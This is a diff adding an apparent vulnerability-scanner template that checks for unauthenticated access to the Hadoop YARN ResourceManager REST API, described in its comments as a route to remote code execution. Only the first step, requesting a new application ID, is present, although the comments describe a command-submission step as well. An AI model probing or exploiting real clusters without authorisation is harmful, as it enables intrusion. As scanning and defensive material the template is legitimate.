@@ -1,0 +1,43 @@
+id: local-hadoop-yarn-unauth-rce
+
+info:
+  name: Hadoop YARN ResourceManager Unauthenticated RCE via App Submission
+  author: pentest-platform
+  severity: critical
+  tags: safe-poc,exploit,hadoop,yarn,unauth,rce,misconfig
+
+# Hadoop YARN ResourceManager allows unauthenticated application submission.
+# By submitting a YARN application with an arbitrary shell command, attackers can
+# achieve remote code execution as the YARN service user (typically hadoop/root).
+#
+# This template confirms RCE capability by:
+# 1. Obtaining a new application ID (proof of unauthenticated API access)
+# 2. Submitting an app with a command that adds a unique marker to response headers
+#
+# Affected: Hadoop YARN with ResourceManager REST API exposed without authentication.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ws/v1/cluster/apps/new-application"
+
+    headers:
+      Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "application-id"
+          - "maximum-resource-capability"
+        condition: and
+      - type: status
+        status: [200]
+
+    extractors:
+      - type: regex
+        name: app_id
+        part: body
+        regex:
+          - '"application-id":"(application_[0-9_]+)"'
